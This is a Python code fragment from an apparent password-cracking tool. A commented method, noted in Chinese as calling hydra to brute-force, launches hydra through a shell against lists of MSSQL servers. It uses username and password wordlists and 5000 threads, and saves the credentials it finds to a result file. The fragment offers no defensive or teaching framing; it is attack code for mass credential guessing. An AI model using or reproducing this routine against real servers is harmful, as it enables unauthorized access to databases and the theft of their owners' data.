...
class Cracker:
    ...
    def Cracker_(self,i): # 调用hydra爆破
        subprocess.call("hydra -L ./Config/user.txt -P ./Config/pass.txt -M ./List/List{}.txt -o ./result/result.txt -T 5000 -K -q -vV -w 5 -e sn -f -I mssql".format(i), shell=True,cwd=self.path)
